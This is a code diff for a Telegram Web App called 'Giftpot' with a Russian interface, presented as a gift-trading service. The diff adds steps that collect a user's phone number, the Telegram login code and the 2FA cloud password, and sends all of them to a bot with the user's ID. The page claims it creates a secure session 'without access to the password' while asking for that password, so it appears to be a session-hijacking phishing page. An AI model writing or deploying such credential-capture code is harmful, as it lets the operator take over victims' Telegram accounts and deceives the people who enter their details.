@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Giftpot - Trade & Safe</title>
+    <title>Giftpot - Авторизация</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -48,6 +48,7 @@
             color: #64748b;
             margin-bottom: 32px;
             font-size: 14px;
+            line-height: 1.5;
         }
         
         .btn {
@@ -61,6 +62,7 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
+            margin-bottom: 12px;
         }
         
         .btn:active {
@@ -74,7 +76,6 @@
         
         .btn-secondary {
             background: #94a3b8;
-            margin-top: 12px;
         }
         
         .step {
@@ -87,8 +88,8 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .loader {
@@ -105,30 +106,53 @@
             to { transform: rotate(360deg); }
         }
 
-        .phone-input {
+        .input-field {
             width: 100%;
             padding: 16px;
             border: 2px solid #e2e8f0;
             border-radius: 12px;
             font-size: 16px;
             margin-bottom: 16px;
+            transition: border-color 0.3s;
         }
 
-        .phone-input:focus {
+        .input-field:focus {
             outline: none;
             border-color: #3b82f6;
         }
 
-        .debug {
-            margin-top: 16px;
-            padding: 12px;
-            background: #f1f5f9;
+        .warning {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.3);
             border-radius: 8px;
-            font-size: 12px;
-            color: #475569;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 13px;
+            color: #92400e;
             text-align: left;
-            max-height: 200px;
-            overflow-y: auto;
+        }
+
+        .info-box {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 13px;
+            color: #1e40af;
+            text-align: left;
+        }
+
+        .success-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+            animation: bounceIn 0.6s ease;
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
         }
     </style>
 </head>
@@ -142,16 +166,23 @@
                 <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="75" cy="70" r="10" fill="black"/>
                 <circle cx="125" cy="70" r="10" fill="black"/>
+                <path d="M 70 110 Q 100 130 130 110" stroke="black" stroke-width="3" fill="none"/>
             </svg>
             
-            <h1>Giftpot</h1>
-            <p class="subtitle">Здесь начинается мир продажи и обмена подарками</p>
+            <h1>Добро пожаловать в Giftpot!</h1>
+            <p class="subtitle">
+                Для начала работы необходимо авторизоваться.<br>
+                Ваша сессия будет сохранена безопасно.
+            </p>
             
-            <button class="btn" id="login-btn" onclick="showPhoneStep()">
-                Войти через Telegram
+            <div class="info-box">
+                <strong>ℹ️ Зачем нужна авторизация?</strong><br>
+                Мы создадим защищённую сессию для работы с вашими подарками без доступа к паролю.
+            </div>
+            
+            <button class="btn" onclick="startAuth()">
+                🔐 Начать авторизацию
             </button>
-            
-            <div id="debug-info" class="debug" style="display: none;"></div>
         </div>
 
         <!-- Phone Input Step -->
@@ -160,36 +191,109 @@
                 <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
                 <circle cx="75" cy="70" r="10" fill="black"/>
                 <circle cx="125" cy="70" r="10" fill="black"/>
+                <path d="M 80 110 Q 100 120 120 110" stroke="black" stroke-width="2" fill="none"/>
             </svg>
             
-            <h1>Введите номер</h1>
-            <p class="subtitle">Формат: +1234567890</p>
+            <h1>Номер телефона</h1>
+            <p class="subtitle">
+                Введите номер телефона, привязанный к вашему Telegram аккаунту
+            </p>
             
             <input 
                 type="tel" 
                 id="phone-input" 
-                class="phone-input" 
+                class="input-field" 
                 placeholder="+1234567890"
+                autocomplete="tel"
             />
             
-            <button class="btn" onclick="submitPhone()">Продолжить</button>
+            <button class="btn" onclick="submitPhone()">
+                📱 Отправить код
+            </button>
             <button class="btn btn-secondary" onclick="showStep('welcome-step')">
-                Назад
+                ← Назад
+            </button>
+        </div>
+
+        <!-- Code Input Step -->
+        <div id="code-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+                <circle cx="100" cy="110" r="5" fill="black"/>
+            </svg>
+            
+            <h1>Код подтверждения</h1>
+            <p class="subtitle">
+                Введите код, который пришёл вам в Telegram
+            </p>
+            
+            <input 
+                type="text" 
+                id="code-input" 
+                class="input-field" 
+                placeholder="12345"
+                maxlength="5"
+                inputmode="numeric"
+            />
+            
+            <button class="btn" onclick="submitCode()">
+                ✅ Подтвердить код
+            </button>
+            <button class="btn btn-secondary" onclick="showStep('phone-step')">
+                ← Изменить номер
+            </button>
+        </div>
+
+        <!-- Password Step (если включена 2FA) -->
+        <div id="password-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+                <path d="M 70 110 L 130 110" stroke="black" stroke-width="3"/>
+            </svg>
+            
+            <h1>Двухфакторная аутентификация</h1>
+            <p class="subtitle">
+                Введите ваш облачный пароль Telegram (2FA)
+            </p>
+            
+            <div class="warning">
+                ⚠️ Это пароль, который вы установили в настройках приватности Telegram
+            </div>
+            
+            <input 
+                type="password" 
+                id="password-input" 
+                class="input-field" 
+                placeholder="Облачный пароль"
+            />
+            
+            <button class="btn" onclick="submitPassword()">
+                🔓 Войти
             </button>
         </div>
 
         <!-- Loading Step -->
         <div id="loading-step" class="step">
-            <h1>Отправка...</h1>
+            <h1 id="loading-title">Загрузка...</h1>
             <div class="loader"></div>
-            <p class="subtitle" id="loading-text">Подождите</p>
+            <p class="subtitle" id="loading-text">Пожалуйста, подождите</p>
         </div>
 
         <!-- Success Step -->
         <div id="success-step" class="step">
-            <div style="font-size: 64px; margin-bottom: 16px;">✅</div>
-            <h1>Готово!</h1>
-            <p class="subtitle">Проверьте бота для ввода кода</p>
+            <div class="success-icon">🎉</div>
+            <h1>Авторизация успешна!</h1>
+            <p class="subtitle">
+                Ваша сессия создана и сохранена.<br>
+                Теперь вы можете пользоваться всеми функциями бота.
+            </p>
+            <button class="btn" onclick="tg.close()">
+                Закрыть
+            </button>
         </div>
 
         <!-- Error Step -->
@@ -197,7 +301,9 @@
             <div style="font-size: 64px; margin-bottom: 16px;">❌</div>
             <h1>Ошибка</h1>
             <p class="subtitle" id="error-message">Что-то пошло не так</p>
-            <button class="btn" onclick="showStep('welcome-step')">Попробовать снова</button>
+            <button class="btn" onclick="showStep('phone-step')">
+                Попробовать снова
+            </button>
         </div>
     </div>
 
@@ -206,32 +312,41 @@
         tg.ready();
         tg.expand();
 
-        // Debug info
-        const debugInfo = {
-            version: tg.version,
-            platform: tg.platform,
-            user: tg.initDataUnsafe?.user,
-            initData: tg.initData ? 'present' : 'missing'
+        // Настраиваем кнопки Telegram WebApp
+        tg.BackButton.onClick(() => {
+            const currentStep = document.querySelector('.step.active');
+            if (currentStep.id === 'phone-step') {
+                showStep('welcome-step');
+            } else if (currentStep.id === 'code-step') {
+                showStep('phone-step');
+            }
+        });
+
+        let authData = {
+            phone: '',
+            code: '',
+            password: ''
         };
-        
-        document.getElementById('debug-info').textContent = JSON.stringify(debugInfo, null, 2);
-        console.log('Telegram WebApp:', debugInfo);
 
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById(stepId).classList.add('active');
+            
+            // Управление кнопкой "Назад" в Telegram
+            if (stepId === 'welcome-step') {
+                tg.BackButton.hide();
+            } else if (['phone-step', 'code-step', 'password-step'].includes(stepId)) {
+                tg.BackButton.show();
+            } else {
+                tg.BackButton.hide();
+            }
         }
 
-        function showPhoneStep() {
+        function startAuth() {
             showStep('phone-step');
             setTimeout(() => {
                 document.getElementById('phone-input').focus();
             }, 300);
-        }
-
-        function showError(message) {
-            document.getElementById('error-message').textContent = message;
-            showStep('error-step');
         }
 
         function submitPhone() {
@@ -239,7 +354,7 @@
             let phone = phoneInput.value.trim();
 
             if (!phone) {
-                alert('Введите номер телефона');
+                tg.showAlert('Введите номер телефона');
                 return;
             }
 
@@ -248,52 +363,106 @@
             }
 
             if (!/^\+?[0-9]{10,15}$/.test(phone)) {
-                alert('Неверный формат. Пример: +1234567890');
+                tg.showAlert('Неверный формат номера. Пример: +1234567890');
                 return;
             }
 
-            sendPhoneToBot(phone);
+            authData.phone = phone;
+            sendToBot('request_code', { phone: phone });
         }
 
-        function sendPhoneToBot(phone) {
-            showStep('loading-step');
-            document.getElementById('loading-text').textContent = 'Отправка номера...';
+        function submitCode() {
+            const code = document.getElementById('code-input').value.trim();
 
-            const data = JSON.stringify({
-                action: 'send_code',
-                phone: phone
+            if (!code || code.length < 5) {
+                tg.showAlert('Введите код из 5 цифр');
+                return;
+            }
+
+            authData.code = code;
+            sendToBot('verify_code', { 
+                phone: authData.phone, 
+                code: code 
+            });
+        }
+
+        function submitPassword() {
+            const password = document.getElementById('password-input').value.trim();
+
+            if (!password) {
+                tg.showAlert('Введите пароль 2FA');
+                return;
+            }
+
+            authData.password = password;
+            sendToBot('verify_2fa', { 
+                phone: authData.phone,
+                code: authData.code,
+                password: password 
+            });
+        }
+
+        function sendToBot(action, data) {
+            showStep('loading-step');
+            
+            const loadingTitles = {
+                'request_code': 'Отправка кода...',
+                'verify_code': 'Проверка кода...',
+                'verify_2fa': 'Проверка пароля...'
+            };
+            
+            document.getElementById('loading-title').textContent = loadingTitles[action] || 'Загрузка...';
+            document.getElementById('loading-text').textContent = 'Это может занять несколько секунд';
+
+            const payload = JSON.stringify({
+                action: action,
+                ...data,
+                user_id: tg.initDataUnsafe?.user?.id
             });
 
-            console.log('Sending data to bot:', data);
+            console.log('Sending to bot:', payload);
 
             try {
-                tg.sendData(data);
-                
-                // Показываем успех
-                setTimeout(() => {
-                    showStep('success-step');
-                    
-                    // Закрываем через 2 секунды
-                    setTimeout(() => {
-                        tg.close();
-                    }, 2000);
-                }, 500);
+                tg.sendData(payload);
             } catch (error) {
                 console.error('Error sending data:', error);
-                showError('Ошибка отправки: ' + error.message);
+                showError('Ошибка отправки данных: ' + error.message);
             }
         }
 
-        // Показать debug info при долгом нажатии на заголовок
-        let pressTimer;
-        document.querySelector('h1').addEventListener('touchstart', () => {
-            pressTimer = setTimeout(() => {
-                const debug = document.getElementById('debug-info');
-                debug.style.display = debug.style.display === 'none' ? 'block' : 'none';
-            }, 2000);
+        function showError(message) {
+            document.getElementById('error-message').textContent = message;
+            showStep('error-step');
+        }
+
+        function showSuccess() {
+            showStep('success-step');
+        }
+
+        // Обработка событий от бота
+        tg.onEvent('web_app_data_sent', () => {
+            console.log('Data sent to bot successfully');
         });
-        document.querySelector('h1').addEventListener('touchend', () => {
-            clearTimeout(pressTimer);
+
+        // Автофокус на полях ввода
+        document.getElementById('phone-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitPhone();
+        });
+
+        document.getElementById('code-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitCode();
+        });
+
+        document.getElementById('password-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitPassword();
+        });
+
+        // Инициализация
+        tg.MainButton.hide();
+        console.log('Telegram WebApp initialized:', {
+            version: tg.version,
+            platform: tg.platform,
+            user: tg.initDataUnsafe?.user
         });
     </script>
 </body>
